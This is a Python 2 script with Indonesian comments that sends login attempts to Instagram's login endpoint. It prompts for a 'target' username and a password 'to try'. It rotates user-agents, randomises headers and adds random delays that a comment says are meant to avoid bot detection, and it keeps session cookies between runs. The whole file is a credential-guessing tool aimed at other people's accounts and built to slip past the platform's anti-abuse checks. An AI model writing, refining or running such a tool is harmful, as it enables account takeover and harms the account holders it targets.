
# Script igg.py yang telah diperbaiki agar tetap sama dengan versi asli tetapi berjalan di Python 2
from multiprocessing.dummy import Pool as ThreadPool
import urlparse
import requests
import json
import time
import random

# Daftar User-Agent agar lebih acak
user_agents = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
]

# Menggunakan session untuk menyimpan cookies
session = requests.Session()

# Fungsi untuk memuat cookie dari file
def load_cookies():
    try:
        with open("cookies.txt", "r") as f:
            cookies = json.load(f)
            session.cookies.update(cookies)
    except:
        pass

# Fungsi untuk menyimpan cookie ke file
def save_cookies():
    with open("cookies.txt", "w") as f:
        json.dump(session.cookies.get_dict(), f)

# Fungsi untuk melakukan login request dengan dukungan cookie
def login_request(username, password):
    headers = {
        'user-agent': random.choice(user_agents),
        'x-ig-app-id': '936619743392459',
        'x-instagram-ajax': str(random.randint(1000000000, 2000000000)),
        'referer': 'https://www.instagram.com/',
        'accept-language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9']),
        'x-requested-with': 'XMLHttpRequest'
    }

    data = {
        'username': username,
        'password': password
    }

    # Delay acak sebelum request untuk menghindari deteksi bot
    time.sleep(random.randint(5, 15))

    # Memuat cookie sebelum request
    load_cookies()

    response = session.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=data)

    # Menyimpan cookie setelah request
    save_cookies()

    return response.json()

# Menjalankan script dengan input manual, mempertahankan fitur asli
if __name__ == "__main__":
    username = raw_input("Masukkan username target: ")
    password = raw_input("Masukkan password untuk dicoba: ")
    result = login_request(username, password)
    print result
